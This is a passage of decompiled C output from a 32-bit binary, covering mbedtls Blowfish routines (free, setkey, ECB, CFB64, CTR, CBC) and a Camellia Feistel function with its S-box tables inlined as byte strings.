        // branch -> 0x806e1cb
    }
}

// Address range: 0x806e250 - 0x806e26f
void mbedtls_blowfish_free(char * a1) {
    int32_t v1 = (int32_t)a1;
    g1 = v1;
    if (a1 == NULL) {
        // 0x806e26a
        return;
    }
    // 0x806e25a
    g6 = v1 + 0x1048;
    *(char *)v1 = 0;
    int32_t v2 = g1 + 1; // 0x806e263
    g1 = v2;
    // branch -> 0x806e260
    while (v2 != g6) {
        // 0x806e260
        *(char *)v2 = 0;
        v2 = g1 + 1;
        g1 = v2;
        // continue -> 0x806e260
    }
    // 0x806e26a
    // branch -> 0x806e26a
}

// Address range: 0x806e270 - 0x806e45f
// Used cryptographic patterns:
//  - Blowfish_bfp_table (32-bit, little endian)
//  - Blowfish_s_init (32-bit, little endian)
void mbedtls_blowfish_setkey(int32_t * a1, int32_t a2, int32_t a3) {
    // 0x806e270
    g1 = -22;
}

// Address range: 0x806e460 - 0x806e59f
int32_t mbedtls_blowfish_crypt_ecb(int32_t * a1, int32_t a2, char * a3, char * a4) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a3;
    unsigned char v3 = *a3; // 0x806e46f
    unsigned char v4 = *(char *)(v2 + 3); // 0x806e472
    unsigned char v5 = *(char *)(v2 + 5); // 0x806e476
    unsigned char v6 = *(char *)(v2 + 1); // 0x806e47f
    unsigned char v7 = *(char *)(v2 + 2); // 0x806e48b
    int32_t v8 = 256 * (int32_t)v7 | 0x10000 * (int32_t)v6 | 0x1000000 * (int32_t)v3 | (int32_t)v4; // 0x806e492
    unsigned char v9 = *(char *)(v2 + 4); // 0x806e494
    unsigned char v10 = *(char *)(v2 + 7); // 0x806e49d
    unsigned char v11 = *(char *)(v2 + 6); // 0x806e4a1
    int32_t v12 = 0x1000000 * (int32_t)v9 | 0x10000 * (int32_t)v5 | (int32_t)v10 | 256 * (int32_t)v11; // 0x806e4aa
    int32_t v13; // eax
    int32_t v14;
    if (a2 == 0) {
        int32_t v15 = v1; // 0x806e4c0
        int32_t v16 = v15 - 4; // 0x806e4c3
        uint32_t v17 = *(int32_t *)(v15 + 68) ^ v8; // 0x806e4c6
        int32_t v18 = *(int32_t *)(v1 + 72 + 4 * v17 / 0x1000000); // 0x806e4d2
        int32_t v19 = *(int32_t *)(v1 + 1096 + 4 * (v17 / 0x10000 % 256)); // 0x806e4dc
        int32_t v20 = *(int32_t *)(v1 + 2120 + 4 * (v17 / 256 % 256)); // 0x806e4e6
        int32_t v21 = *(int32_t *)(v1 + 3144 + 4 * (v17 % 256)); // 0x806e4f0
        int32_t v22 = v21 + (v20 ^ v19 + v18) ^ v12; // 0x806e4f7
        // branch -> 0x806e4c0
        while (v16 != v1 - 64) {
            // 0x806e4c0
            v12 = v17;
            v15 = v16;
            v16 = v15 - 4;
            v17 = *(int32_t *)(v15 + 68) ^ v22;
            v18 = *(int32_t *)(v1 + 72 + 4 * v17 / 0x1000000);
            v19 = *(int32_t *)(v1 + 1096 + 4 * (v17 / 0x10000 % 256));
            v20 = *(int32_t *)(v1 + 2120 + 4 * (v17 / 256 % 256));
            v21 = *(int32_t *)(v1 + 3144 + 4 * (v17 % 256));
            v22 = v21 + (v20 ^ v19 + v18) ^ v12;
            // continue -> 0x806e4c0
        }
        // 0x806e500
        v13 = *(int32_t *)(v1 + 4) ^ v22;
        v14 = *a1 ^ v17;
        // branch -> 0x806e505
    } else {
        int32_t v23 = v1 + 64; // 0x806e548
        int32_t v24 = v1; // 0x806e550
        int32_t v25 = v24 + 4; // 0x806e552
        uint32_t v26 = *(int32_t *)v24 ^ v8; // 0x806e555
        int32_t v27 = *(int32_t *)(v1 + 72 + 4 * v26 / 0x1000000); // 0x806e561
        int32_t v28 = *(int32_t *)(v1 + 1096 + 4 * (v26 / 0x10000 % 256)); // 0x806e56b
        int32_t v29 = *(int32_t *)(v1 + 2120 + 4 * (v26 / 256 % 256)); // 0x806e575
        int32_t v30 = *(int32_t *)(v1 + 3144 + 4 * (v26 % 256)); // 0x806e57f
        int32_t v31 = v30 + (v29 ^ v28 + v27) ^ v12; // 0x806e586
        // branch -> 0x806e550
        while (v25 != v23) {
            // 0x806e550
            v12 = v26;
            v24 = v25;
            v25 = v24 + 4;
            v26 = *(int32_t *)v24 ^ v31;
            v27 = *(int32_t *)(v1 + 72 + 4 * v26 / 0x1000000);
            v28 = *(int32_t *)(v1 + 1096 + 4 * (v26 / 0x10000 % 256));
            v29 = *(int32_t *)(v1 + 2120 + 4 * (v26 / 256 % 256));
            v30 = *(int32_t *)(v1 + 3144 + 4 * (v26 % 256));
            v31 = v30 + (v29 ^ v28 + v27) ^ v12;
            // continue -> 0x806e550
        }
        // 0x806e58f
        v13 = *(int32_t *)v23 ^ v31;
        v14 = *(int32_t *)(v1 + 68) ^ v26;
        // branch -> 0x806e505
    }
    int32_t v32 = (int32_t)a4; // ecx
    *a4 = (char)(v14 / 0x1000000);
    *(char *)(v32 + 1) = (char)(v14 / 0x10000);
    *(char *)(v32 + 2) = (char)(v14 / 256);
    *(char *)(v32 + 4) = (char)(v13 / 0x1000000);
    *(char *)(v32 + 5) = (char)(v13 / 0x10000);
    *(char *)(v32 + 7) = (char)v13;
    *(char *)(v32 + 3) = (char)v14;
    *(char *)(v32 + 6) = (char)(v13 / 256);
    return 0;
}

// Address range: 0x806e5a0 - 0x806e68f
void mbedtls_blowfish_crypt_cfb64(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = g5; // 0x806e5a3
    int32_t v2 = g7; // 0x806e5a4
    int32_t v3 = g3; // 0x806e5a5
    g5 = a5;
    int32_t v4 = *a4; // 0x806e5b4
    g3 = v4;
    if (a2 != 0) {
        // 0x806e5b8
        g7 = 0;
        if (a3 != 0) {
            int32_t v5 = 0; // 0x806e5df21
            // branch -> 0x806e5f2
            while (true) {
                int32_t v6 = v5; // 0x806e5e5
                int32_t v7 = v4; // 0x806e5d3
                if (v4 == 0) {
                    char * v8 = (char *)g5;
                    mbedtls_blowfish_crypt_ecb((int32_t *)a1, 1, v8, v8);
                    v6 = g7;
                    v7 = g3;
                    // branch -> 0x806e5d0
                }
                int32_t v9 = g5 + v7; // 0x806e5d3
                g3 = (v7 + 1) % 8;
                unsigned char v10 = *(char *)(v6 + a6) ^ *(char *)v9; // 0x806e5df28
                *(char *)(v6 + a7) = v10;
                g7++;
                *(char *)v9 = (char)(int32_t)v10;
                int32_t v11 = g7; // 0x806e5ed
                if (v11 != a3) {
                    // 0x806e5d0
                    v5 = v11;
                    v4 = g3;
                    // branch -> 0x806e5f2
                    continue;
                }
                // 0x806e620
                g1 = 0;
                *a4 = g3;
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return;
            }
        }
        // 0x806e620
        g1 = 0;
        *a4 = g3;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return;
    }
    // 0x806e618
    if (a3 != 0) {
        // 0x806e630
        g7 = 0;
        char * v12 = (char *)a5;
        int32_t v13 = 0; // 0x806e63e24
        // branch -> 0x806e65e
        while (true) {
            int32_t v14 = v4; // 0x806e649
            int32_t v15 = v13; // 0x806e651
            if (v4 == 0) {
                // 0x806e662
                g5 = a1;
                mbedtls_blowfish_crypt_ecb((int32_t *)a1, 1, v12, v12);
                v14 = g3;
                v15 = g7;
                // branch -> 0x806e638
            }
            unsigned char v16 = *(char *)(v15 + a6); // 0x806e63e
            int32_t v17 = v14 + a5; // 0x806e647
            g3 = (v14 + 1) % 8;
            *(char *)(v15 + a7) = *(char *)v17 ^ v16;
            g7++;
            *(char *)v17 = (char)(int32_t)v16;
            int32_t v18 = g7; // 0x806e659
            if (v18 != a3) {
                // 0x806e638
                v13 = v18;
                v4 = g3;
                // branch -> 0x806e65e
                continue;
            }
            // 0x806e620
            g1 = 0;
            *a4 = g3;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return;
        }
    }
    // 0x806e620
    g1 = 0;
    *a4 = g3;
    g3 = v3;
    g7 = v2;
    g5 = v1;
}

// Address range: 0x806e690 - 0x806e71f
void mbedtls_blowfish_crypt_ctr(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = g5; // 0x806e693
    int32_t v2 = g7; // 0x806e694
    int32_t v3 = g3; // 0x806e695
    g5 = a4;
    int32_t v4 = *a3; // 0x806e6a7
    g3 = v4;
    if (a2 == 0) {
        // 0x806e710
        *a3 = v4;
        g1 = 0;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return;
    }
    // 0x806e6ab
    g7 = 0;
    int32_t v5 = 0; // 0x806e6b313
    // branch -> 0x806e6ce
    int32_t v6;
    while (true) {
        int32_t v7 = v4; // 0x806e6bd
        int32_t v8 = v5; // 0x806e6c3
        if (v4 == 0) {
            int32_t v9 = a5; // 0x806e6d5
            mbedtls_blowfish_crypt_ecb((int32_t *)a1, 1, (char *)g5, (char *)v9);
            a5 = v9;
            char * v10 = (char *)(g5 + 7); // 0x806e6f8_0
            *v10 = (char)((int32_t)*v10 + 1);
            v7 = g3;
            v8 = g7;
            // branch -> 0x806e6b0
        }
        char v11 = *(char *)(v8 + a6); // 0x806e6b3
        char v12 = *(char *)(a5 + v7); // 0x806e6ba
        g3 = (v7 + 1) % 8;
        *(char *)(v8 + a7) = v12 ^ v11;
        int32_t v13 = g7 + 1; // 0x806e6c6
        g7 = v13;
        v6 = g3;
        if (v13 == a2) {
            // break -> 0x806e710
            break;
        }
        v5 = v13;
        v4 = v6;
        // continue -> 0x806e6ce
    }
    // 0x806e710
    // branch -> 0x806e710
    // 0x806e710
    *a3 = v6;
    g1 = 0;
    g3 = v3;
    g7 = v2;
    g5 = v1;
}

// Address range: 0x806e720 - 0x806e81f
void mbedtls_blowfish_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6) {
    g1 = -24;
    int32_t v1 = g5; // 0x806e728
    int32_t v2 = g7; // 0x806e729
    int32_t v3 = g3; // 0x806e72a
    g3 = (int32_t)a4;
    int32_t v4 = a3;
    if (a3 == 7) {
        // 0x806e737
        int32_t v5; // eax
        if (a2 == 0) {
            // 0x806e745
            g5 = 0;
            int32_t v6;
            int32_t v7 = &v6; // 0x806e747_0
            int32_t v8 = 0; // 0x806e75a
            // branch -> 0x806e750
            while (true) {
                int32_t v9 = v8 + a5; // 0x806e756
                v5 = v9;
                g7 = v8 + a6;
                *(int32_t *)v7 = *(int32_t *)v9;
                *(int32_t *)(v7 + 4) = *(int32_t *)(v5 + 4);
                mbedtls_blowfish_crypt_ecb((int32_t *)a1, 0, (char *)v5, (char *)g7);
                int32_t v10 = 0; // 0x806e78c
                char * v11 = (char *)(g7 + v10); // 0x806e78c_0
                *v11 = *v11 ^ *(char *)(g3 + v10);
                int32_t v12 = 1; // 0x806e78f
                // branch -> 0x806e788
                while (v12 != 8) {
                    // 0x806e788
                    v10 = v12;
                    v11 = (char *)(g7 + v10);
                    *v11 = *v11 ^ *(char *)(g3 + v10);
                    v12++;
                    // continue -> 0x806e788
                }
                // 0x806e797
                g5 += 8;
                *(int32_t *)g3 = *(int32_t *)v7;
                *(int32_t *)(g3 + 4) = *(int32_t *)(v7 + 4);
                int32_t v13 = g5; // 0x806e7a4
                if (v4 == v13) {
                    // 0x806e7a9
                    g1 = 0;
                    // branch -> 0x806e7ab
                    // 0x806e7ab
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return;
                }
                // 0x806e797
                v8 = v13;
                // branch -> 0x806e750
            }
        } else {
            // 0x806e7c8
            g5 = 0;
            int32_t v14 = 0; // 0x806e7d2
            // branch -> 0x806e7c8
          lab_0x806e7c8:
            while (true) {
                // 0x806e7c8
                v5 = 0;
                int32_t v15 = v14 + a5; // 0x806e7d0
                int32_t v16 = v14 + a6; // 0x806e7d2
                g7 = v16;
                int32_t v17 = 0; // 0x806e7df
                // branch -> 0x806e7d8
                while (true) {
                    char v18 = *(char *)(g3 + v17); // 0x806e7d8
                    char v19 = *(char *)(v17 + v15); // 0x806e7dc
                    *(char *)(v17 + v16) = v19 ^ v18;
                    int32_t v20 = v5 + 1; // 0x806e7e2
                    v5 = v20;
                    if (v20 == 8) {
                        // 0x806e7ea
                        g5 += 8;
                        char * v21 = (char *)g7;
                        mbedtls_blowfish_crypt_ecb((int32_t *)a1, a2, v21, v21);
                        *(int32_t *)g3 = *(int32_t *)g7;
                        *(int32_t *)(g3 + 4) = *(int32_t *)(g7 + 4);
                        int32_t v22 = g5; // 0x806e811
                        if (v4 == v22) {
                            // break (via goto) -> 0x806e816
                            goto lab_0x806e816;
                        }
                        v14 = v22;
                        // continue (via goto) -> 0x806e7c8
                        goto lab_0x806e7c8;
                    } else {
                        // 0x806e7d8
                        v16 = g7;
                        v17 = v20;
                        // branch -> 0x806e7d8
                        continue;
                    }
                }
              lab_0x806e816:
                // 0x806e816
                g1 = 0;
                // branch -> 0x806e7ab
                // 0x806e7ab
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return;
            }
        }
    }
    // 0x806e7ab
    g3 = v3;
    g7 = v2;
    g5 = v1;
}

// Address range: 0x806e840 - 0x806e8ff
// Used cryptographic patterns:
//  - Camellia_s1 (8-bit, little endian)
//  - Camellia_s2 (8-bit, little endian)
//  - Camellia_s3 (8-bit, little endian)
//  - Camellia_s4 (8-bit, little endian)
int32_t camellia_feistel(int32_t a1, int32_t a2, int32_t a3) {
    uint32_t v1 = *(int32_t *)g1 ^ *(int32_t *)g6; // 0x806e848
    uint32_t v2 = *(int32_t *)(g1 + 4) ^ *(int32_t *)(g6 + 4); // 0x806e84d
    unsigned char v3 = *(char *)(v1 % 256 + (int32_t)"\x70\x2c\xb3\xc0\xe4\x57\xea\xae\x23\x6b\x45\xa5\xed\x4f\x1d\x92\x86\xaf\x7c\x1f\x3e\xdc\x5e\x0b\xa6\x39\xd5\x5d\xd9\x5a\x51\x6c\x8b\x9a\xfb\xb0\x74\x2b\xf0\x84\xdf\xcb\x34\x76\x6d\xa9\xd1\x04\x14\x3a\xde\x11\x32\x9c\x53\xf2\xfe\xcf\xc3\x7a\x24\xe8\x60\x69\xaa\xa0\xa1\x62\x54\x1e\xe0\x64\x10\x00\xa3\x75\x8a\xe6\x09\xdd\x87\x83\xcd\x90\x73\xf6\x9d\xbf\x52\xd8\xc8\xc6\x81\x6f\x13\x63\xe9\xa7\x9f\xbc\x29\xf9\x2f\xb4\x78\x06\xe7\x71\xd4\xab\x88\x8d\x72\xb9\xf8\xac\x36\x2a\x3c\xf1\x40\xd3\xbb\x43\x15\xad\x77\x80\x82\xec\x27\xe5\x85\x35\x0c\x41\xef\x93\x19\x21\x0e\x4e\x65\xbd\xb8\x8f\xeb\xce\x30\x5f\xc5\x1a\xe1\xca\x47\x3d\x01\xd6\x56\x4d\x0d\x66\xcc\x2d\x12\x20\xb1\x99\x4c\xc2\x7e\x05\xb7\x31\x17\xd7\x58\x61\x1b\x1c\x0f\x16\x18\x22\x44\xb2\xb5\x91\x08\xa8\xfc\x50\xd0\x7d\x89\x97\x5b\x95\xff\xd2\xc4\x48\xf7\xdb\x03\xda\x3f\x94\x5c\x02\x4a\x33\x67\xf3\x7f\xe2\x9b\x26\x37\x3b\x96\x4b\xbe\x2e\x79\x8c\x6e\x8e\xf5\xb6\xfd\x59\x98\x6a\x46\xba\x25\x42\xa2\xfa\x07\x55\xee\x0a\x49\x68\x38\xa4\x28\x7b\xc9\xc1\xe3\xf4\xc7\x9e"); // 0x806e860
    unsigned char v4 = *(char *)(v1 / 0x1000000 + (int32_t)"\x70\x82\x2c\xec\xb3\x27\xc0\xe5\xe4\x85\x57\x35\xea\x0c\xae\x41\x23\xef\x6b\x93\x45\x19\xa5\x21\xed\x0e\x4f\x4e\x1d\x65\x92\xbd\x86\xb8\xaf\x8f\x7c\xeb\x1f\xce\x3e\x30\xdc\x5f\x5e\xc5\x0b\x1a\xa6\xe1\x39\xca\xd5\x47\x5d\x3d\xd9\x01\x5a\xd6\x51\x56\x6c\x4d\x8b\x0d\x9a\x66\xfb\xcc\xb0\x2d\x74\x12\x2b\x20\xf0\xb1\x84\x99\xdf\x4c\xcb\xc2\x34\x7e\x76\x05\x6d\xb7\xa9\x31\xd1\x17\x04\xd7\x14\x58\x3a\x61\xde\x1b\x11\x1c\x32\x0f\x9c\x16\x53\x18\xf2\x22\xfe\x44\xcf\xb2\xc3\xb5\x7a\x91\x24\x08\xe8\xa8\x60\xfc\x69\x50\xaa\xd0\xa0\x7d\xa1\x89\x62\x97\x54\x5b\x1e\x95\xe0\xff\x64\xd2\x10\xc4\x00\x48\xa3\xf7\x75\xdb\x8a\x03\xe6\xda\x09\x3f\xdd\x94\x87\x5c\x83\x02\xcd\x4a\x90\x33\x73\x67\xf6\xf3\x9d\x7f\xbf\xe2\x52\x9b\xd8\x26\xc8\x37\xc6\x3b\x81\x96\x6f\x4b\x13\xbe\x63\x2e\xe9\x79\xa7\x8c\x9f\x6e\xbc\x8e\x29\xf5\xf9\xb6\x2f\xfd\xb4\x59\x78\x98\x06\x6a\xe7\x46\x71\xba\xd4\x25\xab\x42\x88\xa2\x8d\xfa\x72\x07\xb9\x55\xf8\xee\xac\x0a\x36\x49\x2a\x68\x3c\x38\xf1\xa4\x40\x28\xd3\x7b\xbb\xc9\x43\xc1\x15\xe3\xad\xf4\x77\xc7\x80\x9e"); // 0x806e86a
    unsigned char v5 = *(char *)(v1 / 256 % 256 + (int32_t)"\x38\x41\x16\x76\xd9\x93\x60\xf2\x72\xc2\xab\x9a\x75\x06\x57\xa0\x91\xf7\xb5\xc9\xa2\x8c\xd2\x90\xf6\x07\xa7\x27\x8e\xb2\x49\xde\x43\x5c\xd7\xc7\x3e\xf5\x8f\x67\x1f\x18\x6e\xaf\x2f\xe2\x85\x0d\x53\xf0\x9c\x65\xea\xa3\xae\x9e\xec\x80\x2d\x6b\xa8\x2b\x36\xa6\xc5\x86\x4d\x33\xfd\x66\x58\x96\x3a\x09\x95\x10\x78\xd8\x42\xcc\xef\x26\xe5\x61\x1a\x3f\x3b\x82\xb6\xdb\xd4\x98\xe8\x8b\x02\xeb\x0a\x2c\x1d\xb0\x6f\x8d\x88\x0e\x19\x87\x4e\x0b\xa9\x0c\x79\x11\x7f\x22\xe7\x59\xe1\xda\x3d\xc8\x12\x04\x74\x54\x30\x7e\xb4\x28\x55\x68\x50\xbe\xd0\xc4\x31\xcb\x2a\xad\x0f\xca\x70\xff\x32\x69\x08\x62\x00\x24\xd1\xfb\xba\xed\x45\x81\x73\x6d\x84\x9f\xee\x4a\xc3\x2e\xc1\x01\xe6\x25\x48\x99\xb9\xb3\x7b\xf9\xce\xbf\xdf\x71\x29\xcd\x6c\x13\x64\x9b\x63\x9d\xc0\x4b\xb7\xa5\x89\x5f\xb1\x17\xf4\xbc\xd3\x46\xcf\x37\x5e\x47\x94\xfa\xfc\x5b\x97\xfe\x5a\xac\x3c\x4c\x03\x35\xf3\x23\xb8\x5d\x6a\x92\xd5\x21\x44\x51\xc6\x7d\x39\x83\xdc\xaa\x7c\x77\x56\x05\x1b\xa4\x15\x34\x1e\x1c\xf8\x52\x20\x14\xe9\xbd\xdd\xe4\xa1\xe0\x8a\xf1\xd6\x7a\xbb\xe3\x40\x4f"); // 0x806e877
    unsigned char v6 = *(char *)(v1 / 0x10000 % 256 + (int32_t)"\xe0\x05\x58\xd9\x67\x4e\x81\xcb\xc9\x0b\xae\x6a\xd5\x18\x5d\x82\x46\xdf\xd6\x27\x8a\x32\x4b\x42\xdb\x1c\x9e\x9c\x3a\xca\x25\x7b\x0d\x71\x5f\x1f\xf8\xd7\x3e\x9d\x7c\x60\xb9\xbe\xbc\x8b\x16\x34\x4d\xc3\x72\x95\xab\x8e\xba\x7a\xb3\x02\xb4\xad\xa2\xac\xd8\x9a\x17\x1a\x35\xcc\xf7\x99\x61\x5a\xe8\x24\x56\x40\xe1\x63\x09\x33\xbf\x98\x97\x85\x68\xfc\xec\x0a\xda\x6f\x53\x62\xa3\x2e\x08\xaf\x28\xb0\x74\xc2\xbd\x36\x22\x38\x64\x1e\x39\x2c\xa6\x30\xe5\x44\xfd\x88\x9f\x65\x87\x6b\xf4\x23\x48\x10\xd1\x51\xc0\xf9\xd2\xa0\x55\xa1\x41\xfa\x43\x13\xc4\x2f\xa8\xb6\x3c\x2b\xc1\xff\xc8\xa5\x20\x89\x00\x90\x47\xef\xea\xb7\x15\x06\xcd\xb5\x12\x7e\xbb\x29\x0f\xb8\x07\x04\x9b\x94\x21\x66\xe6\xce\xed\xe7\x3b\xfe\x7f\xc5\xa4\x37\xb1\x4c\x91\x6e\x8d\x76\x03\x2d\xde\x96\x26\x7d\xc6\x5c\xd3\xf2\x4f\x19\x3f\xdc\x79\x1d\x52\xeb\xf3\x6d\x5e\xfb\x69\xb2\xf0\x31\x0c\xd4\xcf\x8c\xe2\x75\xa9\x4a\x57\x84\x11\x45\x1b\xf5\xe4\x0e\x73\xaa\xf1\xdd\x59\x14\x6c\x92\x54\xd0\x78\x70\xe3\x49\x80\x50\xa7\xf6\x77\x93\x86\x83\x2a\xc7\x5b\xe9\xee\x8f\x01\x3d"); // 0x806e87e
    unsigned char v7 = *(char *)(v2 % 256 + (int32_t)"\x70\x82\x2c\xec\xb3\x27\xc0\xe5\xe4\x85\x57\x35\xea\x0c\xae\x41\x23\xef\x6b\x93\x45\x19\xa5\x21\xed\x0e\x4f\x4e\x1d\x65\x92\xbd\x86\xb8\xaf\x8f\x7c\xeb\x1f\xce\x3e\x30\xdc\x5f\x5e\xc5\x0b\x1a\xa6\xe1\x39\xca\xd5\x47\x5d\x3d\xd9\x01\x5a\xd6\x51\x56\x6c\x4d\x8b\x0d\x9a\x66\xfb\xcc\xb0\x2d\x74\x12\x2b\x20\xf0\xb1\x84\x99\xdf\x4c\xcb\xc2\x34\x7e\x76\x05\x6d\xb7\xa9\x31\xd1\x17\x04\xd7\x14\x58\x3a\x61\xde\x1b\x11\x1c\x32\x0f\x9c\x16\x53\x18\xf2\x22\xfe\x44\xcf\xb2\xc3\xb5\x7a\x91\x24\x08\xe8\xa8\x60\xfc\x69\x50\xaa\xd0\xa0\x7d\xa1\x89\x62\x97\x54\x5b\x1e\x95\xe0\xff\x64\xd2\x10\xc4\x00\x48\xa3\xf7\x75\xdb\x8a\x03\xe6\xda\x09\x3f\xdd\x94\x87\x5c\x83\x02\xcd\x4a\x90\x33\x73\x67\xf6\xf3\x9d\x7f\xbf\xe2\x52\x9b\xd8\x26\xc8\x37\xc6\x3b\x81\x96\x6f\x4b\x13\xbe\x63\x2e\xe9\x79\xa7\x8c\x9f\x6e\xbc\x8e\x29\xf5\xf9\xb6\x2f\xfd\xb4\x59\x78\x98\x06\x6a\xe7\x46\x71\xba\xd4\x25\xab\x42\x88\xa2\x8d\xfa\x72\x07\xb9\x55\xf8\xee\xac\x0a\x36\x49\x2a\x68\x3c\x38\xf1\xa4\x40\x28\xd3\x7b\xbb\xc9\x43\xc1\x15\xe3\xad\xf4\x77\xc7\x80\x9e"); // 0x806e890
    unsigned char v8 = *(char *)(v2 / 256 % 256 + (int32_t)"\x70\x2c\xb3\xc0\xe4\x57\xea\xae\x23\x6b\x45\xa5\xed\x4f\x1d\x92\x86\xaf\x7c\x1f\x3e\xdc\x5e\x0b\xa6\x39\xd5\x5d\xd9\x5a\x51\x6c\x8b\x9a\xfb\xb0\x74\x2b\xf0\x84\xdf\xcb\x34\x76\x6d\xa9\xd1\x04\x14\x3a\xde\x11\x32\x9c\x53\xf2\xfe\xcf\xc3\x7a\x24\xe8\x60\x69\xaa\xa0\xa1\x62\x54\x1e\xe0\x64\x10\x00\xa3\x75\x8a\xe6\x09\xdd\x87\x83\xcd\x90\x73\xf6\x9d\xbf\x52\xd8\xc8\xc6\x81\x6f\x13\x63\xe9\xa7\x9f\xbc\x29\xf9\x2f\xb4\x78\x06\xe7\x71\xd4\xab\x88\x8d\x72\xb9\xf8\xac\x36\x2a\x3c\xf1\x40\xd3\xbb\x43\x15\xad\x77\x80\x82\xec\x27\xe5\x85\x35\x0c\x41\xef\x93\x19\x21\x0e\x4e\x65\xbd\xb8\x8f\xeb\xce\x30\x5f\xc5\x1a\xe1\xca\x47\x3d\x01\xd6\x56\x4d\x0d\x66\xcc\x2d\x12\x20\xb1\x99\x4c\xc2\x7e\x05\xb7\x31\x17\xd7\x58\x61\x1b\x1c\x0f\x16\x18\x22\x44\xb2\xb5\x91\x08\xa8\xfc\x50\xd0\x7d\x89\x97\x5b\x95\xff\xd2\xc4\x48\xf7\xdb\x03\xda\x3f\x94\x5c\x02\x4a\x33\x67\xf3\x7f\xe2\x9b\x26\x37\x3b\x96\x4b\xbe\x2e\x79\x8c\x6e\x8e\xf5\xb6\xfd\x59\x98\x6a\x46\xba\x25\x42\xa2\xfa\x07\x55\xee\x0a\x49\x68\x38\xa4\x28\x7b\xc9\xc1\xe3\xf4\xc7\x9e"); // 0x806e8a1
    unsigned char v9 = *(char *)(v2 / 0x1000000 + (int32_t)"\xe0\x05\x58\xd9\x67\x4e\x81\xcb\xc9\x0b\xae\x6a\xd5\x18\x5d\x82\x46\xdf\xd6\x27\x8a\x32\x4b\x42\xdb\x1c\x9e\x9c\x3a\xca\x25\x7b\x0d\x71\x5f\x1f\xf8\xd7\x3e\x9d\x7c\x60\xb9\xbe\xbc\x8b\x16\x34\x4d\xc3\x72\x95\xab\x8e\xba\x7a\xb3\x02\xb4\xad\xa2\xac\xd8\x9a\x17\x1a\x35\xcc\xf7\x99\x61\x5a\xe8\x24\x56\x40\xe1\x63\x09\x33\xbf\x98\x97\x85\x68\xfc\xec\x0a\xda\x6f\x53\x62\xa3\x2e\x08\xaf\x28\xb0\x74\xc2\xbd\x36\x22\x38\x64\x1e\x39\x2c\xa6\x30\xe5\x44\xfd\x88\x9f\x65\x87\x6b\xf4\x23\x48\x10\xd1\x51\xc0\xf9\xd2\xa0\x55\xa1\x41\xfa\x43\x13\xc4\x2f\xa8\xb6\x3c\x2b\xc1\xff\xc8\xa5\x20\x89\x00\x90\x47\xef\xea\xb7\x15\x06\xcd\xb5\x12\x7e\xbb\x29\x0f\xb8\x07\x04\x9b\x94\x21\x66\xe6\xce\xed\xe7\x3b\xfe\x7f\xc5\xa4\x37\xb1\x4c\x91\x6e\x8d\x76\x03\x2d\xde\x96\x26\x7d\xc6\x5c\xd3\xf2\x4f\x19\x3f\xdc\x79\x1d\x52\xeb\xf3\x6d\x5e\xfb\x69\xb2\xf0\x31\x0c\xd4\xcf\x8c\xe2\x75\xa9\x4a\x57\x84\x11\x45\x1b\xf5\xe4\x0e\x73\xaa\xf1\xdd\x59\x14\x6c\x92\x54\xd0\x78\x70\xe3\x49\x80\x50\xa7\xf6\x77\x93\x86\x83\x2a\xc7\x5b\xe9\xee\x8f\x01\x3d"); // 0x806e8b0
    int32_t v10 = v9; // 0x806e8b0
    unsigned char v11 = *(char *)(v2 / 0x10000 % 256 + (int32_t)"\x38\x41\x16\x76\xd9\x93\x60\xf2\x72\xc2\xab\x9a\x75\x06\x57\xa0\x91\xf7\xb5\xc9\xa2\x8c\xd2\x90\xf6\x07\xa7\x27\x8e\xb2\x49\xde\x43\x5c\xd7\xc7\x3e\xf5\x8f\x67\x1f\x18\x6e\xaf\x2f\xe2\x85\x0d\x53\xf0\x9c\x65\xea\xa3\xae\x9e\xec\x80\x2d\x6b\xa8\x2b\x36\xa6\xc5\x86\x4d\x33\xfd\x66\x58\x96\x3a\x09\x95\x10\x78\xd8\x42\xcc\xef\x26\xe5\x61\x1a\x3f\x3b\x82\xb6\xdb\xd4\x98\xe8\x8b\x02\xeb\x0a\x2c\x1d\xb0\x6f\x8d\x88\x0e\x19\x87\x4e\x0b\xa9\x0c\x79\x11\x7f\x22\xe7\x59\xe1\xda\x3d\xc8\x12\x04\x74\x54\x30\x7e\xb4\x28\x55\x68\x50\xbe\xd0\xc4\x31\xcb\x2a\xad\x0f\xca\x70\xff\x32\x69\x08\x62\x00\x24\xd1\xfb\xba\xed\x45\x81\x73\x6d\x84\x9f\xee\x4a\xc3\x2e\xc1\x01\xe6\x25\x48\x99\xb9\xb3\x7b\xf9\xce\xbf\xdf\x71\x29\xcd\x6c\x13\x64\x9b\x63\x9d\xc0\x4b\xb7\xa5\x89\x5f\xb1\x17\xf4\xbc\xd3\x46\xcf\x37\x5e\x47\x94\xfa\xfc\x5b\x97\xfe\x5a\xac\x3c\x4c\x03\x35\xf3\x23\xb8\x5d\x6a\x92\xd5\x21\x44\x51\xc6\x7d\x39\x83\xdc\xaa\x7c\x77\x56\x05\x1b\xa4\x15\x34\x1e\x1c\xf8\x52\x20\x14\xe9\xbd\xdd\xe4\xa1\xe0\x8a\xf1\xd6\x7a\xbb\xe3\x40\x4f"); // 0x806e8bd
    int32_t v12 = 256 * (int32_t)v8 | (int32_t)v7 | 0x1000000 * v10 | 0x10000 * (int32_t)v11; // 0x806e8d1
    uint32_t v13 = (256 * v12 | v10) ^ (256 * (int32_t)v5 | 0x1000000 * (int32_t)v4 | (int32_t)v3 | 0x10000 * (int32_t)v6); // 0x806e8d8
    uint32_t v14 = (0x10000 * v13 | v13 / 0x10000) ^ v12; // 0x806e8df
    int32_t result = (0x1000000 * v14 | v14 / 256) ^ v13; // 0x806e8e6
    g1 = result;
    int32_t * v15 = (int32_t *)(g4 + 4); // 0x806e8ef_0
    *v15 = result ^ *v15;
    int32_t v16 = (0x1000000 * result | result / 256) ^ v14 ^ *(int32_t *)g4; // 0x806e8f2
    g6 = v16;
    *(int32_t *)g4 = v16;
    int32_t v17;
    g2 = v17;
    return result;
}

// Address range: 0x806e900 - 0x806e91f
void mbedtls_camellia_free(char * a1) {
